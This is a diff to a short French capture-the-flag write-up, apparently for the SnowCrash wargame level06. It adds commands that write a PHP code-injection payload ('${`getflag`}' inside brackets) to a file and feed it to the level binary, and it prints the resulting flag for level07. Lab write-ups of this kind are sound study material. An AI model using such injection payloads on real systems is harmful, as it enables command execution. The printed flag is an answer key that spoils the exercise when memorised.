@@ -63,4 +63,11 @@ Avec la syntaxe d’exec php avec ${} et les backticks on met ca dans le fichier
 
 **[x ${\`getflag\`}]**
 
+donc on termine avec ces commandes:
+```sh
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/test
+level06@SnowCrash:~$ ./level06 /tmp/test
+```
+
+
 Ensuite on lanc level06 avec notre fichier en arg et on a le flag **wiok45aaoguiboiki2tuin6ub** pour se connecter au level07 
